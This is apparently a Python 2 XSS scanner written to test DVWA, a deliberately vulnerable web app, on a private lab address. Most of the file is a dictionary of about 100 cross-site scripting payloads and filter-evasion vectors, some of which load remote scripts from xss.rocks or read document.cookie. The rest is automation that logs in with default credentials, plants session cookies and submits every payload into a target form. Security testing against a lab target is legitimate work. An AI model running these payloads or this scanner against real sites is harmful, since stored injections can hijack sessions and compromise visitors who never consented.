#-*- coding: utf-8 -*-

import HTMLParser
import mechanize
import urllib2
#import dtos
#import getSession
from mechanize._form import TextControl
#import attp
import datetime, time
from py4j.java_gateway import JavaGateway, GatewayParameters
import csv

#print att_patterns
# with open('./xss_payloads.txt', 'r') as f:
#    att_patterns.append(f.readlines())
#    f.close()

# att_patterns = dtos.singlilist(att_patterns)



def getPatterns():
#	dict = {}
#	with open('pattern_dict.csv') as csvfile:
#		reader = csv.DictReader(csvfile)
#		for row in reader:
			#print (row['title'], row['pattern'])
#			dict[row['title']]=row['pattern'].strip()
#		csvfile.close()
	dict = {
		'Ignore Case':'<sCriPt>alert("XSS");</sCriPt>.',
		'XSS Locator' : ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
		,'XSS Locator (short)' : '\';!--"<XSS>=&{()}'
		,'XSS basic' : ' <script>alert(\'hyeji\')</script>'
		,'No Filter Evasion' : '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>'
		,'Filter bypass based polyglot' : '""">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)>\',\'<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->""></script><script>alert(document.cookie)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id)>\'"\"><img src=""http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"">"',
		'Image XSS using the JavaScript directive ' : '<IMG SRC="javascript:alert(\'XSS\');">',
		'No quotes and no semicolon' : '<IMG SRC=javascript:alert(\'XSS\')>'
		,'Case insensitive XSS attack vector' : '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>'
		,'HTML entities' : '<IMG SRC=javascript:alert("XSS")>'
		,'Grave accent obfuscation' : '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'
		,'Malformed IMG tags' : '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'
		,'fromCharCode' : '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
		,'Default SRC tag to get past filters that check SRC domain' : '<IMG SRC=# onmouseover="alert(\'xxs\')">'
		,'Default SRC tag by leaving it empty' : '<IMG SRC= onmouseover="alert(\'xxs\')">'
		,'Default SRC tag by leaving it out entirely' : '<IMG onmouseover="alert(\'xxs\')">'
		,'On error alert' : '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'
		,'IMG  onerror and javascript alert encode' : '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">'
		,'Decimal HTML character references' : '"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"'
		,'Decimal HTML character references without trailing semicolons' : '"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"'
		,'Hexadecimal HTML character references without trailing semicolons' : '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
		,'Embedded tab' : '"<IMG SRC=""jav	ascript:alert(\'XSS\');"">"'
		,'Embedded Encoded tab' : '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">'
		,'Embedded newline to break up XSS' : '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">'
		,'Embedded carriage return to break up XSS' : '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">'
		,'Null breaks up JavaScript directive' : 'perl -e \'print "<IMG SRC=java\0script:alert(\"XSS\")>";\' > out'
		,'Non-alpha-non-digit XSS' : '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>'
		,'Extraneous open brackets' : '<<SCRIPT>alert("XSS");//<</SCRIPT>'
		,'No closing script tags' : '<SCRIPT SRC=http://xss.rocks/xss.js?< B >'
		,'Protocol resolution in script tags' : '<SCRIPT SRC=//xss.rocks/.j>'
		,'Half open HTML/JavaScript XSS vector' : '<IMG SRC="javascript:alert(\'XSS\')"'
		,'Double open angle brackets' : '<iframe src=http://xss.rocks/scriptlet.html <'
		,'Escaping JavaScript escapes' : '\";alert(\'XSS\');//'
		,'End title tag' : '</TITLE><SCRIPT>alert("XSS");</SCRIPT>'
		,'INPUT image' : '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">'
		,'BODY image' : '<BODY BACKGROUND="javascript:alert(\'XSS\')">'
		,'IMG Dynsrc' : '<IMG DYNSRC="javascript:alert(\'XSS\')">'
		,'IMG lowsrc' : '<IMG LOWSRC="javascript:alert(\'XSS\')">'
		,'List-style-image' : '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>'
		,'VBscript in an image' : '<IMG SRC=\'vbscript:msgbox("XSS")\'>'
		,'Livescript (older versions of Netscape only)' : '<IMG SRC="livescript:[code]">'
		,'SVG object tag' : '<svg/onload=alert(\'XSS\')>'
		,'BODY tag' : '<BODY ONLOAD=alert(\'XSS\')>'
		,'BGSOUND' : '<BGSOUND SRC="javascript:alert(\'XSS\');">'
		,'& JavaScript includes' : '<BR SIZE="&{alert(\'XSS\')}">'
		,'STYLE sheet' : '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">'
		,'Remote style sheet' : '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">'
		,'Remote style sheet part 2' : '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>'
		,'Remote style sheet part 3' : '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">'
		,'Remote style sheet part 4' : '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>'
		,'STYLE tags with broken up JavaScript for XSS' : '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>'
		,'STYLE attribute using a comment to break up expression' : '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">'
		,'IMG STYLE with expression' : 'exp/*<A STYLE=\'no\\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))\'>'
		,'STYLE tag (Older versions of Netscape only)' : '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>'
		,'STYLE tag using background-image' : '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>'
		,'STYLE tag using background' : '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>'
		,'Anonymous HTML with STYLE attribute' : '<XSS STYLE="xss:expression(alert(\'XSS\'))">'
		,'Local htc file' : '<XSS STYLE="behavior: url(xss.htc);">'
		,'META' : '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">'
		,'META using data' : '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">'
		,'META with additional URL parameter' : '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">'
		,'IFRAME' : '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>'
		,'IFRAME Event based' : '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>'
		,'FRAME' : '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>'
		,'TABLE' : '<TABLE BACKGROUND="javascript:alert(\'XSS\')">'
		,'TD' : '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">'
		,'DIV' : '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">'
		,'DIV background-image' : '<DIV STYLE="background-image:\0075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">'
		,'DIV background-image with unicoded XSS exploit' : '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">'
		,'DIV background-image plus extra characters' : '<DIV STYLE="width: expression(alert(\'XSS\'));">'
		,'Downlevel-Hidden block' : '"<!--[if gte IE 4]> <SCRIPT>alert(\'XSS\');</SCRIPT> <![endif]-->"'
		,'BASE tag' : '<BASE HREF="javascript:alert(\'XSS\');//">'
		,'OBJECT tag' : ' <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'
		,'Using an EMBED tag you can embed a Flash movie that contains XSS' : 'EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>'
		,'You can EMBED SVG which can contain your XSS vector' : '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'
		,'Using ActionScript inside flash can obfuscate your XSS vector' : 'a="get";b="URL(\"";c="javascript:";d="alert(\'XSS\');\")";eval(a+b+c+d);'
		,'XML data island with CDATA obfuscation' : '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
		,'Locally hosted XML with embedded JavaScript that is generated using an XML data island' : '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>'
		,'HTML+TIME in XML' : '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>'
		,'Assuming you can only fit in a few characters and it filters against ".js"' : '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>'
		,'SSI (Server Side Includes)' : '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd=\"/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'\"-->'
		,'PHP' : '<? echo(\'<SCR)\';echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>'
		,'IMG Embedded commands' : '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">'
		,'IMG Embedded commands part II' : 'Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser'
		,'Cookie manipulation' : '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">'
		,'UTF-7 encoding(2)' : '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-'
		,'XSS using HTML quote encapsulation(1)' : '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'XSS using HTML quote encapsulation(2)' : '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'XSS using HTML quote encapsulation(3)' : '<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'XSS using HTML quote encapsulation(4)' : '<SCRIPT "a=\'>\'" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>'
		,'XSS using HTML quote encapsulation(5)' : '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'XSS using HTML quote encapsulation(6)' : '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'XSS using HTML quote encapsulation(7)' : '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>'
		,'IP verses hostname' : '<A HREF="http://66.102.7.147/">XSS</A>'
		,'URL encoding' : '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>'
		,'Dword encoding' : '<A HREF="http://1113982867/">XSS</A>'
		,'Hex encoding' : '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>'
		,'Octal encoding' : '<A HREF="http://0102.0146.0007.00000223/">XSS</A>'
		,'Mixed encoding' : '<A HREF="h   tt      p://6   6.000146.0x7.147/">XSS</A>'
		,'Protocol resolution bypass' : '<A HREF="//www.google.com/">XSS</A>'
	}
	return dict


def getBr(url, id,pwd): 
	cj = mechanize.CookieJar()
	br = mechanize.Browser()
	br.set_cookiejar(cj)
	br.open(url)
	br.select_form(nr=0)
	br.form['username']=id
	br.form['password']=pwd
	cj.clear_session_cookies()
	cookie1 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5',False,False,'/',True,False,None,True,None,None,{},False)
	cookie2 = mechanize.Cookie(0, 'PHPSESSID', 'i4i8d3n27cphmjppcv1iuhfuf2', None,False,'192.168.0.5',False,False,'/',True,False,None,True,None,None,{},False)
	cookie3 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa',False,False,'',True,False,None,True,None,None,{},False)
	cookie4 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/vulnerabilities',False,False,'/',True,False,None,True,None,None,{},False)
	cookie5 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/vulnerabilities/xss_s',False,False,'',True,False,None,True,None,None,{},False)
	cookie6 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/',False,False,'/',True,False,None,True,None,None,{},False)


	cj.set_cookie(cookie1)
	cj.set_cookie(cookie2)
	cj.set_cookie(cookie3)
	cj.set_cookie(cookie4)
	cj.set_cookie(cookie5)
	cj.set_cookie(cookie6)
	
	br.submit()
	print 'did.'
	print cj
	return [br, cj]

def xss_mechanize(url, formList, fieldList, att_patterns):
	vul_count=0 
	vul_pattern=[]
	br = mechanize.Browser()
	br, ch = getBr(url,'admin','password')
	br.open(url)
	br.set_handle_equiv(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)

	#test = br.form
	br.form = list(br.forms())[0]   #forms..(1 includes login)
	print "=============form list============="
	for form in br.forms():
	   formList.append(form.name)

	for i in formList:
	   print i 
	print '%d forms have been found!' % len(formList) 
	print "===================================\n"

	print "============field list============="
	for control in br.form.controls:
	   fieldList.append(control.name)

	for i in fieldList:
	   print i
	print '%d fields have been found!' % len(fieldList)
	print "===================================\n"
	print 'control name : ', control.name, control.type
	

	vul_count, vul_pattern, ptrn_list = get_info(br, att_patterns, vul_count, vul_pattern)
	
	return formList, fieldList, vul_pattern, vul_count, ptrn_list


def get_info(br, att_patterns, vul_count, vul_pattern):
		
	print "===============info================\n"

#	textControl = ''
	ptrn_list = []
	
	for k, pattern in att_patterns.items():
#	for pattern in att_patterns.values():
#		for i in range (len(br.form.controls)):
		
		textControl = br.form.controls[0]
#		print textControl
#		print i
		#submitControl = br.form.controls[1]
		
		#print '1', submitControl.name, submitControl.type
		textControl.value = pattern
		#print datetime.datetime.now()
		print '1. attack query: ', textControl.value, '   type: ',textControl.type
		
		res = br.submit()
		res_add = res.geturl()
		res_code = res.code
		print res_code
		html_code = str(res.read())
		
		
		if pattern in html_code:
			flag = True
			print 'true'
			vul_count += 1

			vul_pattern.append(pattern)
			
			ptrn_list.append(k)
			#print len(ptrn_list)
			
		else:
			pass
			print 'false'

		#test = re.compile(str(res.read()))
		#result = re.findall(patterns, str(html_code))
		#print result
		
		#print bad
		print '2. HTTP header: ', res.read()
		#print '2. HTTP header: ', res.read()

	 	print '3. HTTP response: ', urllib2.urlopen(res_add).getcode()
	#   print '******', HTMLParser.HTMLParser().unescape(res.read()), '********'
		#print '******', html_code, '********'
		br.form = list(br.forms())[0]
	 
	print vul_count, ", " , len(att_patterns)
#	for i in vul_pattern:
#		vul_pattern.append(i) 
			
	return vul_count, vul_pattern, ptrn_list

def main(url):
	#url = 'http://192.168.0.5/dvwa/vulnerabilities/xss_s/'
	today = time.localtime()
	scanTime = "%04d-%02d-%02d %02d:%02d:%02d" % (today.tm_year, today.tm_mon, today.tm_mday, today.tm_hour, today.tm_min, today.tm_sec)
	vul_count = 0
	vul_pattern = []
	formList=[]   #saves form names
	fieldList=[] #saves field names
	

	print url, "**scanning start**"
	
	att_patterns = getPatterns() 
	att_count = len(att_patterns)
	print 'attack patterns : ', len(att_patterns)
	#get result
	formList, fieldList, vul_pattern, vul_count, ptrn_list = xss_mechanize(url, formList, fieldList, att_patterns)
	
	
	#[1] url, date
	print "[1]url,",url,",date:",scanTime	
	print "[2]formnamelist,",formList,",fieldlist,",fieldList
	print "[3.1]Cross-Site-Scripting,",vul_pattern
	print "[3.2]Cross-Site-Scripting,",ptrn_list

	print vul_count, att_count

	
	#도메인 / 일시 / (//**3.폼리스트개수만)/ 발생취약점 [배열] 취약점 명 (sql/xss) / 취약점 패턴명(syntax error) / 공격 쿼리 or 스크립트 /취약점 패턴 요약설명 /플래그 /4. 폼정보(공격하는 대상)/ 폼 타입/ 폼명 /태그아이디 명 Htrml 코드 보여주기(보류)



if __name__ == "__main__":
#   main(sys.argv[1])
#	main("http://192.168.0.5/dvwa/vulnerabilities/xss_r/")
	#'http://192.168.0.5/dvwa/vulnerabilities/xss_r/' #reflected
	#'http://192.168.0.5/dvwa/vulnerabilities/xss_s/' #stored

	gateway = JavaGateway()
	print "python dfsaf 코드 실행중......"
	print "python py4j gateway start......"
	java_url = gateway.entry_point.getStack() # 브라우져
	print "python py4j getUrl 호출......"
	main(java_url.getUrl())
